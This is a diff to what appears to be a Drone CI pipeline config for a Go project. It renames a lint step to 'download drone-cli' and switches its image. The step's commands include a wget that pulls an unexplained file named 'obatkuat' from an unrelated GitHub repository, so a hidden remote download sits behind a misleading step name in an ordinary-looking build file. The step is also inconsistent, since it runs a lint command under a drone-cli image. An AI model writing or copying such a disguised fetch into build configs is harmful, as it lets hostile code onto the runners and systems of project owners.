@@ -5,8 +5,8 @@ workspace:
   base: /go
   path: src/github.com/suzuki-shunsuke/drone-jsonnet-generator
 steps:
-- name: golangci-lint
-  image: golangci/golangci-lint:v1.26.0
+- name: download drone-cli
+  image: drone/cli:1.2.2-alpine
   commands:
   - golangci-lint run
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
